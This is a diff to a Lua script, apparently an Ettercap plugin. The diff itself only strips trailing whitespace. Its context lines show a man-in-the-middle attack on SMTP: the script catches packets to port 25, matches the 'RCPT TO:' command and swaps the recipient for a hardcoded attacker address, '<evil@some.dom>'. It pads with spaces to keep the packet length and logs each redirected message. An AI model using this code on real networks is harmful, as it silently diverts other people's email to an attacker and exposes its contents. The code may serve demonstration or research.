@@ -11,7 +11,7 @@ local stdlib = require("std")
 hook_point = hook_points.tcp
 
 packetrule = function(packet_object)
-  return(packet_object:is_tcp() and 
+  return(packet_object:is_tcp() and
           packet_object:has_data() and
           packet_object:dst_port() == 25)
 end
@@ -20,7 +20,7 @@ local RCPT_PAT = "^(RCPT TO:)([^\r\n]*)"
 local evil_address = "<evil@some.dom>"
 
 -- Here's your action.
-action = function(packet_object) 
+action = function(packet_object)
   -- Read the packet data
   data = packet_object:read_data()
   local start, e, cmd, recipient = data:find(RCPT_PAT)
@@ -37,10 +37,10 @@ action = function(packet_object)
   end
 
   -- Generate new recipient, pad the front with spaces "     <evil@some.dom>"
-  local inj_addr = string.rep(" ", padding_amount) ..  evil_address 
+  local inj_addr = string.rep(" ", padding_amount) ..  evil_address
 
   -- Swap original recipient for our bad-guy address:
-  --  "RCPT TO:     <evil@some.dom>\r\n" 
+  --  "RCPT TO:     <evil@some.dom>\r\n"
   local new_msg = data:gsub(RCPT_PAT, "%1" .. inj_addr)
 
   ettercap.log("Redirected email: %s -> %s\n", recipient, evil_address)
